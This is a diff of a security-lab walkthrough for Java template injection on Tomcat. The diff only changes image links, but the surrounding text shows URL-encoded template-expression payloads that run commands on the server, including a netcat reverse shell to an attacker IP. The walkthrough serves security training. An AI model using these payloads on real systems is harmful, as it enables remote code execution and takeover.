@@ -24,11 +24,11 @@ Also, trying to trigger error messages on the application can also give away a l
 
 On the landing page of the application, we have a page containing 2 links to different pages. Both redirects to an error page.
 
-![](../../.gitbook/assets/java/SSTI/1.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/1.png)
 
 On the error pages, we continue searching for initial clues to find an attack vector. We realize that changing value in the URL is reflected on the response of the error page.
 
-![](../../.gitbook/assets/java/SSTI/2.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/2.png)
 
 Let's play with URL a bit more to find out more information. In the screenshot below in the response of the error, we find that a Java backend is running, accompanied with the server "Tomcat". 
 
@@ -36,7 +36,7 @@ Let's play with URL a bit more to find out more information. In the screenshot b
 http://0.0.0.0:5000/error/test|
 ```
 
-![](../../.gitbook/assets/java/SSTI/3.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/3.png)
 
 Now, what we have is a reflected user input on the error page with 'HTTP 500' and it is a Java application running on Tomcat.
 
@@ -71,7 +71,7 @@ As found in the docs:
 
 Let's see what happens when we inject the expression with the operator described above!
 
-![](../../.gitbook/assets/java/SSTI/4.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/4.png)
 
 ## Exploitation
 
@@ -96,25 +96,25 @@ Running 'id' command on target server:
 
 ```
 
-![](../../.gitbook/assets/java/SSTI/5.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/5.png)
 
 Even tough the result is not seen in the frontend, we can see that 'id' command has been executed on the server logs.
 
-![](../../.gitbook/assets/java/SSTI/6.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/6.png)
 
 Running 'touch pwn' command on target server to create a file named 'pwn' on current running directory.
 ```
 ::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20pwn%22).getInputStream()).next()%7d__::
 ```
 
-![](../../.gitbook/assets/java/SSTI/7.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/7.png)
 
 Running netcat command on target server to get a revershell to our attacking machine by using the payload below.
 ```
 ::__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22nc%20-c%20bash%20192.168.13.131%201337%22).getInputStream()).next()%7D__::
 ```
 
-![](../../.gitbook/assets/java/SSTI/8.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/8.png)
 
 Yes! We got the reverse shell and the control over the target machine.
 
